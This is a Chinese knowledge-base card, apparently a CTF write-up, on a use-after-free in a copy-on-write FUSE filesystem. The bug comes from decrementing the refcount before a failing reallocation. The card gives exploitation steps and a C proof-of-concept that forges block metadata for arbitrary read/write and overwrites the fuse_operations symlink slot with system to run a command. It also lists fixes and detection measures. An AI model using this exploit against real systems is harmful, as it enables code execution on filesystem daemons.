---
id: binary-pwn-heap-fuse-cow-refcount-uaf-fuse-operations-hijack
title: FUSE CoW 引用计数 UAF：异常 offset 让旧数据块 refcount 减一但指针未换，伪造 metadata 任意读写并劫持 fuse_operations
type: scenario
domain: binary
path: binary/pwn/heap
technique: fuse-cow-refcount-uaf-fuse-operations-hijack
tags:
- pwn
- heap
- uaf
- fuse
- refcount
- copy-on-write
- arbitrary-read-write
- function-pointer
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-166
  verified_at: '2026-11-06T10:12:45+08:00'
  notes: 已对照 alifs 段核对：CoW refcount 异常路径、fake metadata 任意读写、fuse_operations symlink 改 system 均吻合；PoC 未执行
url: /docs/binary/pwn/heap/binary-pwn-heap-fuse-cow-refcount-uaf-fuse-operations-hijack/
draft: false
kb_aliases:
- FUSE CoW UAF
- 引用计数 UAF
- fuse_operations 劫持
- 数据块 metadata 伪造
- 异常 offset 写
- alifs
---

## 一句话结论

FUSE 文件系统用 CoW + 引用计数管理文件数据块：`link` 只增加 refcount，写入 refcount>1 的文件时先减旧块引用、再分配新块。若 `write` 的 offset 过大导致新块分配抛异常，旧块 refcount 已被减一但文件的数据块指针未更新，形成数据块 UAF；由于数据块内保存“数据指针 + 大小”，伪造 metadata 即可获得任意地址读写，再改写堆上的 `fuse_operations` 函数表（如 `symlink` → `system`）执行命令。

## 原理

- **CoW + refcount**：文件数据块由 `{refcnt, vec_beg, vec_end, vec_cap}` 之类的 metadata 描述；`link` 复制文件时只把 refcnt 加一，不复制数据。写入时若 refcnt>1，需要为新数据分配新块，并把旧块 refcnt 减一。
- **异常路径的顺序缺陷**：`write(offset > file_size)` 会触发“重新分配数据块”。代码先取消旧引用（refcnt--），再尝试分配新块；如果 offset 过大/长度异常使分配抛异常，异常路径直接返回，旧文件的数据块指针没有被替换。结果：旧块 refcnt 已减（可能变为 0 被释放），但文件仍指向它 → UAF。
- **UAF 变任意读写**：数据块 metadata 中包含数据缓冲区指针与长度；UAF 后重新分配/伪造该 metadata（通过可写的控制文件或其它对象占位），把 `vec_beg/vec_end` 指向目标地址，`pread/pwrite` 文件即可读写任意地址。示例通过打开控制文件 `f` 写 32 字节 fake metadata 实现 `make_vec(start,len)`，再 `pread` 泄露堆/libc。
- **劫持 fuse_operations**：`struct fuse_operations` 是 FUSE 处理各文件系统操作的函数指针表，通常分配在堆上。其相对堆基址的偏移在固定版本/固定启动流程下是确定的；用任意写把 `symlink` 槽位改成 `system`，再执行 `symlink("cat /flag > /cow/flag &", "x")`，FUSE 调用 `symlink` 时实际执行 `system`。
- **为什么不用改 GOT**：`fuse_operations` 是数据表，CFI/RELRO 不保护；堆地址可通过 UAF 泄露，函数指针槽位偏移可通过本地调试确定。

## 触发条件

- 目标实现 FUSE 文件系统，使用 CoW/引用计数管理数据块，`write` 的 offset 可由用户控制。
- 异常路径在“减少旧引用”之后、“替换指针”之前抛出（如超大 offset 导致分配失败/异常）。
- 攻击者可创建硬链接（提高 refcount）、写文件、读取控制文件或 metadata（用于泄露/伪造）。
- 堆布局稳定，`fuse_operations` 相对堆基址偏移可预测；目标 libc 有 `system`。

## 利用步骤

1. **制造共享数据块**：`link("not_flag", "n1")` 让两个文件名共享同一数据块，refcnt=2；打开 `n1` 准备写入。
2. **触发异常 CoW**：`pwrite(fd, "", 1, 0x10000000000000)` 用超大 offset 触发重新分配；分配失败时旧块 refcnt 已减一，但文件指针未更新 → UAF。
3. **释放旧引用**：`unlink("not_flag")` 删除另一个引用，使旧块彻底释放/可被复用。
4. **伪造 metadata 泄露堆**：通过控制文件 `f` 写入 `{refcnt=1, vec_beg=0, vec_end=0, vec_cap=0}`，再 `pwrite(fd,"",1,0)` 触发分配并 `pread` 读回 metadata，得到新块的堆地址（`fm.vec_beg`）。
5. **泄露 libc/堆布局**：`pwrite(fd,"",1,0x410)` 分配下一个块并读回其指针（unsorted bin 地址），计算 libc 基址；结合堆基址计算 `fuse_operations` 地址。
6. **任意读写**：`make_vec(target, len)` 把 metadata 的 vec 范围指向目标地址；`pread` 读、`pwrite` 写。
7. **劫持 symlink**：把 `fuse_operations.symlink` 槽位（示例偏移 48）写成 `system`；执行 `symlink("cat /flag > /cow/flag &", "x")`，以 FUSE 进程权限执行命令。
8. **读取结果**：等待命令执行后读取 `/cow/flag`。

## PoC

```c
struct fake_metadata { size_t refcnt; void *vec_beg, *vec_end, *vec_cap; };

void make_vec(void *start, size_t len) {
    int fd_ctl = open("f", O_WRONLY);
    struct fake_metadata d = { .refcnt = 1, .vec_beg = start,
                               .vec_end = start + len, .vec_cap = start + len };
    pwrite(fd_ctl, &d, 32, 0);
    close(fd_ctl);
}

void do_leak(void) {
    int fd_ctl = open("f", O_RDONLY);
    pread(fd_ctl, &fm, 32, 0);
    close(fd_ctl);
}

int main(void) {
    chdir("/cow");
    link("not_flag", "n1");              // refcnt = 2
    creat("f", 0777);
    fd = open("n1", O_RDWR);
    pwrite(fd, "", 1, 0x10000000000000ull);  // 异常 CoW：旧块 refcnt--，指针未换
    unlink("not_flag");                  // 旧块彻底释放

    make_vec(0, 0);
    pwrite(fd, "", 1, 0);                // 触发分配
    do_leak();
    void *heap_base = fm.vec_beg;

    pwrite(fd, "", 1, 0x410);            // 下一个块，泄露 libc
    do_leak();
    void *heap_unsort = fm.vec_beg;

    pwrite(fd, "", 1, 4 * 4096);
    make_vec(heap_unsort - 4096, 4096 + 32);
    struct { void *p1, *p2; } buf;
    pread(fd, &buf, 16, 4096);           // 读 unsorted bin 指针

    u64 fuse_vtbl = (u64)heap_base - 0x5600be612350ull + 0x5600be612890ull + 0x30;
    u64 libc_base = (u64)buf.p1 - 0x7fbf10e09f10 + 0x7fbf10c00000;
    u64 libc_system = libc_base + 0x53b00;

    make_vec((void *)(fuse_vtbl - 8192), 8192 + 1024);
    pwrite(fd, &libc_system, 8, 8192 + 48);   // symlink 槽位
    close(fd);
    symlink("cat /flag > /cow/flag &", "x");
    sleep(2);
    /* 打开 /cow/flag 读取命令输出 */
}
```

示例中的堆/libc 偏移是题目二进制与 libc 的硬编码值，实际需本地调试；本卡不执行 PoC。

## 变体与关联

- **其它 CoW/快照文件系统**：Btrfs/ZFS 快照、overlayfs、容器镜像层等也有引用计数与写时复制；异常路径顺序错误可能产生同类 UAF。
- **数据块结构不同**：metadata 可能包含 `data` 指针、长度、压缩标志；只要能伪造指针/长度即可任意读写。
- **函数表位置**：`fuse_operations` 可能在 `.data`/堆/只读段；堆上版本可直接改，只读段需其它写原语。
- **关联**：[[binary-pwn-heap-uaf-function-pointer-hijack]]（堆 UAF 改函数指针）、[[binary-pwn-kernel-cve-2024-1086-nft-verdict-double-free-dirty-pagetable-modprobe]]（引用计数/double free 对照）、[[binary-pwn-heap-negative-size-malloc-failure-stale-pointer-house-of-cat]]（异常路径悬垂指针）。
- **边界**：需要 FUSE 挂载权限与可写控制文件；分配异常路径必须真的抛异常且不修复指针；堆偏移依赖版本，需泄露/调试。

## 检测与防御

- **修复顺序**：先成功分配新块，再减少旧块引用；异常路径必须保持旧指针/引用不变。使用 RAII/事务式引用计数。
- **边界校验**：write offset/长度做范围检查，拒绝超过文件系统最大容量的 offset；限制单次分配大小。
- **最小权限**：FUSE 守护进程以非 root 运行，限制可写目录；对 `fuse_operations` 所在内存加只读保护（如 relro/segment 权限），或使用 CFI 保护间接调用。
- **检测**：引用计数异常（refcnt 变为 0 但仍有文件引用）、堆 UAF 报告、`fuse_operations` 函数指针被改写、FUSE 进程突然执行 shell 命令；审计 `link`/`write`/异常路径。
- **响应**：卸载/重启 FUSE 文件系统，检查 `/cow` 等挂载点是否被写入后门文件，轮换凭据。
